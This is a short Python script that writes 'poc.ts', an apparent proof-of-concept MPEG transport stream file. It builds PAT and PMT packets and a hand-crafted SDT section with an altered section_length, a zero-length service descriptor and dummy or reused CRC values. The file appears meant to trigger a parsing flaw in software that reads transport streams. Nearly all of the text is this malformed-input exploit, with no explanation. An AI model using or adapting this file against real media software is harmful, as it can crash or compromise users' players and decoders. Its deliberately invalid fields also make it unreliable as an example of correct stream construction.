import struct
from zlib import crc32

def build_ts_packet(pid, payload, pusi=1):
    sync_byte = 0x47
    byte1 = 0x40 if pusi else 0x00
    header = bytes([
        sync_byte,
        byte1 | ((pid >> 8) & 0x1F),
        pid & 0xFF,
        0x10  # no adaptation, payload only
    ])
    pointer_field = b'\x00' if pusi else b''
    packet_data = pointer_field + payload
    return header + packet_data + b'\xFF' * (188 - len(header) - len(packet_data))

# --- SDT Helper ---
def build_sdt_section():
    sdt = bytearray()

    sdt += b'\x42'           # table_id (SDT actual)
    sdt += b'\xF0\x13'       # ← section_syntax_indicator + NEW section_length (0x13 = 19 bytes to CRC)
    sdt += b'\x00\x01'       # transport_stream_id
    sdt += b'\xC1'           # version_number (1), current_next_indicator
    sdt += b'\x00'           # section_number
    sdt += b'\x00'           # last_section_number

    sdt += b'\x00\x00\x00\x00\x00\x00\xF0\x02\x48\x00'

    sdt += b'\xDD\xEB\x8E\x74'  # dummy CRC (replace manually later)

    return bytes(sdt)

# --- Build file ---
with open("poc.ts", "wb") as f:
    # --- PAT ---
    pat_payload = bytes([
        0x00, 0xB0, 0x0D,
        0x00, 0x01,
        0xC1, 0x00, 0x00,
        0x00, 0x00,
        0x00, 0x01, 0xE1, 0x00,
        0xDC, 0x90, 0xAC, 0x63
    ])
    f.write(build_ts_packet(0x0000, pat_payload))

    # --- PMT ---
    pmt_payload = bytes([
        0x02, 0xB0, 0x11,
        0x00, 0x01,
        0xC1, 0x00, 0x00,
        0xE1, 0x00,
        0xF0, 0x00,
        0x1B, 0xE1, 0x01,
        0xF0, 0x00,
        0xDC, 0x90, 0xAC, 0x63
    ])
    f.write(build_ts_packet(0x0100, pmt_payload))

    # --- SDT (actual target) ---
    sdt_payload = build_sdt_section()
    f.write(build_ts_packet(0x0011, sdt_payload))